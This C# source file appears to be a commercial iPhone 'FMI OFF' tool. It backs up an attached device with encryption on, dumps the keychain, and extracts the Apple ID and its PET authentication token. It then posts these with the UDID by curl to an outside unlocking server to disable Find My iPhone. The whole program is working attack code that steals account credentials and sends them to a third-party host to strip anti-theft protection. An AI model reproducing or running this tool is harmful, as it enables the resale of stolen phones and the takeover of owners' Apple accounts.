using System;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Linq;
using System.Net.Http;
using System.Collections.Generic;

namespace OpenMenu
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("[-] Open Menu V3.0");
            Console.WriteLine("[-] By: rhcp011235");

            string arch = GetArchitecture();
            
            // Debug
            //Console.WriteLine("Architecture: {0}", arch);

            // Set resource path
            string resourcePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "resources", arch);

            // Debug
            //Console.WriteLine("Resource path: {0}", resourcePath);

            string serialNumber = GetSerialNumber(resourcePath);
            if (!string.IsNullOrEmpty(serialNumber))
        {
            Console.WriteLine($"[+] Serial Number: {serialNumber}");
            bool isRegistered = await CheckSerialNumber(serialNumber);
            if (!isRegistered)
            {
                Console.WriteLine("[!] Serial number is not registered. Please contact an admin to add it.");
                Environment.Exit(1);
            }
        }
        else
        {
            Console.WriteLine("[!] Failed to get serial number");
            Environment.Exit(1);
        }
            
            Console.WriteLine("[+] Enabling encryption for backup");
            //string backupCommand = $"{resourcePath}/{arch}/idevicebackup2.exe -i encryption on 1234 > /dev/null 2>&1";
            string backupCommand = $"{resourcePath}/idevicebackup2.exe -i encryption on 1234";
            // debug
            //Console.WriteLine("Backup command: {0}", backupCommand);

            ExecuteCommand(backupCommand);

            Console.WriteLine("[+] Making backup dir");
            ExecuteCommand("mkdir blah");

            //Console.WriteLine("Enter the apple ID of the device you want to FMI OFF:");
            //string appleId = Console.ReadLine();

            Console.WriteLine("[=] Getting UDID from the device");
            string udid = GetUUID(resourcePath);
            
            // Debug
            Console.WriteLine("UDID: {0}", udid);

            Console.WriteLine("[+] Starting the device backup now");
            PerformBackup(udid, resourcePath);

            Console.WriteLine("[+] Dumping the keychain");
            DumpKeychain2(arch, udid, resourcePath);

            Console.WriteLine("[+] Getting the Apple ID");
            string appl_output = ExecuteCommand("type out");
            string appleId = GetAppleID(appl_output);
            //debug
            Console.WriteLine("Apple ID: {0}", appleId);
            
            Console.WriteLine("[+] Getting our PE Token");
            // Cannot use cat (this is unix only)
            string output = ExecuteCommand("type out");
            string token1 = GetPET(output);
            // debug
            Console.WriteLine("Token1: {0}", token1);
            string token2 = GetPET(output);
            // debug
            Console.WriteLine("Token2: {0}", token2); 
            Console.WriteLine("[+] Getting FMI OFF!");
            PostToServer(appleId, token1, udid);
            PostToServer(appleId, token2, udid);

            Console.WriteLine("[+] Cleaning up");
            ExecuteCommand("del out");
            ExecuteCommand("rd /s /q blah");
        }

        static async Task<bool> CheckSerialNumber(string serialNumber)
    {
        string url = "https://mrcellphoneunlocker.com/manual_openmenu/api.php";

        using (HttpClient client = new HttpClient())
        {
            var content = new FormUrlEncodedContent(new[]
            {
                new KeyValuePair<string, string>("SN", serialNumber)
            });

            try
            {
                HttpResponseMessage response = await client.PostAsync(url, content);
                string responseString = await response.Content.ReadAsStringAsync();

                if (responseString.Trim() == "REGISTERED")
                {
                    return true;
                }
                else if (responseString.Trim() == "NOT_REGISTERED")
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        return false;
    }

        static string GetUUID(string resourcePath)
        {
            string command = $"{resourcePath}\\ideviceinfo.exe";
            string output = ExecuteCommand(command);
            
            // Parse the output to find the UniqueDeviceID
            string pattern = @"UniqueDeviceID\s*:\s*(\w+)";
            Match match = Regex.Match(output, pattern);
            return match.Success ? match.Groups[1].Value.Trim() : null;
        }

    static string GetSerialNumber(string resourcePath)
{
    string command = $"{resourcePath}\\ideviceinfo.exe";
    string output = ExecuteCommand(command);

    // Ensure output isn't empty
    if (string.IsNullOrWhiteSpace(output))
    {
        Console.WriteLine("[!] No output received from ideviceinfo.exe.");
        return string.Empty;
    }

    // Split output into lines and find the correct "SerialNumber:" line
    string[] lines = output.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);
    
    foreach (string line in lines)
    {
        if (line.Trim().StartsWith("SerialNumber:")) // Ensure we get the correct SerialNumber
        {
            string[] parts = line.Split(':');
            if (parts.Length > 1)
            {
                return parts[1].Trim(); // Return the actual serial number
            }
        }
    }

    return string.Empty;
}



        static string ExecuteCommand(string command)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            process.Start();
            string result = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return result;
        }

static void PerformBackup(string udid, string resourcePath)
{
    string command = $"{resourcePath}\\idevicebackup2.exe backup --full blah > NUL 2>&1";
    //Console.WriteLine("Backup command: {0}", command);
    ExecuteCommand(command);
}

static void DumpKeychain2(string arch, string udid, string resourcePath)
{
    string command = $"{resourcePath}\\irestore.exe blah\\{udid}\\ dumpkeys out";
    //Console.WriteLine("Dump command: {0}", command);
    ExecuteCommand(command);
}

public static string GetAppleID(string output)
    {
        // Split the output into lines
        string[] lines = output.Split(new[] { '\n' }, StringSplitOptions.None);
        int targetIndex = -1;
        string appleID = null;

        // Locate the line containing the service token
        for (int i = 0; i < lines.Length; i++)
        {
            if (lines[i].Contains("com.apple.gs.idms.pet.com.apple.account.AppleIDAuthentication.token"))
            {
                targetIndex = i;
                break;
            }
        }

        // Search backwards for "acct" field
        if (targetIndex != -1)
        {
            for (int i = targetIndex; i >= 0; i--)
            {
                string prevLine = lines[i];
                if (prevLine.Contains("\"acct\""))
                {
                    // Extract Apple ID from the line
                    var components = prevLine.Split(':');
                    if (components.Length > 1)
                    {
                        appleID = components.Last().Trim(new char[] { ' ', '"', ',' });
                        break;
                    }
                }
            }
        }

        return appleID ?? string.Empty; // Return empty string if not found
    }

        static string GetPET(string output)
        {
            string token = null;
            var lines = output.Split('\n');
            for (int i = 0; i < lines.Length; i++)
            {
                if (lines[i].Contains("com.apple.gs.idms.pet.com.apple.account.AppleIDAuthentication.token"))
                {
                    for (int j = i + 1; j <= i + 3; j++)
                    {
                        if (lines[j].Contains("\"v_Data\""))
                        {
                            string base64Token = lines[j].Split(':')[1].Trim().Trim('"');
                            byte[] data = Convert.FromBase64String(base64Token);
                            token = System.Text.Encoding.UTF8.GetString(data);
                            return token;
                        }
                    }
                }
            }
            return token;
        }

        static void PostToServer(string appid, string token, string udid)
        {
            string command = $"curl -X POST \"https://mrcellphoneunlocker.com/manual_openmenu/process.php\" -H \"User-Agent: rhcp011235-openmenu\" -H \"Content-Type: application/x-www-form-urlencoded\" --data-urlencode \"appleid={appid}\" --data-urlencode \"PET={token}\" --data-urlencode \"udid={udid}\"";

            var process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/C {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            if (process.ExitCode != 0)
            {
                Console.WriteLine($"Error: Task failed with status {process.ExitCode}");
            }
            else
            {
                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Contains("Model:") || line.Contains("Apple ID:") ||
                        line.Contains("MODE:") || line.Contains("Status:") ||
                        line.Contains("Removed iCloud- Success") ||
                        line.Contains("Not Found Token Or Expired") ||
                        line.Contains("NO DEVICES"))
                    {
                        Console.WriteLine($"Server response: {line}");
                    }
                }
            }
        }

        static string GetArchitecture()
        {
            return Environment.Is64BitOperatingSystem ? "x64" : "x86";
        }
    }
}